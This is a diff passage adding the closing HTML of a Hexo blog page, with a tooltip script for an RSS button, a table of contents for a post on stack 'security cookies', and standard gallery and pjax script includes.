+      tip.style.borderRadius = "8px";
+      tip.style.fontSize = "14px";
+      tip.style.fontWeight = "bold";
+      tip.style.zIndex = "1000";
+      tip.style.opacity = "1";
+      tip.style.transition = "opacity 1s, top 1s";
+
+      rssBtn.style.position = "relative";
+      rssBtn.appendChild(tip);
+
+      setTimeout(() => {
+        tip.style.opacity = "0";
+        tip.style.top = "-40px";
+        setTimeout(() => tip.remove(), 1000);
+      }, 2000);
+
+    } catch (err) {
+      console.error("Failed to copy: ", err);
+    }
+  });
+});
+</script></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Introduction"><span class="toc-number">1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#What-Is-Security-Cookie"><span class="toc-number">2.</span> <span class="toc-text">What Is Security Cookie?</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Demonstration"><span class="toc-number">3.</span> <span class="toc-text">Demonstration</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#How-Security-Cookie-Works"><span class="toc-number">3.1.</span> <span class="toc-text">How Security Cookie Works</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Without-Security-Cookie"><span class="toc-number">3.2.</span> <span class="toc-text">Without Security Cookie</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypassing-Security-Cookie"><span class="toc-number">3.3.</span> <span class="toc-text">Bypassing Security Cookie</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Conclusion"><span class="toc-number">4.</span> <span class="toc-text">Conclusion</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#THANKS-FOR-READING"><span class="toc-number">5.</span> <span class="toc-text">THANKS FOR READING!</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/custom.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {code.findCode();
+document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script><script src="/js/slide.js"></script></body></html>
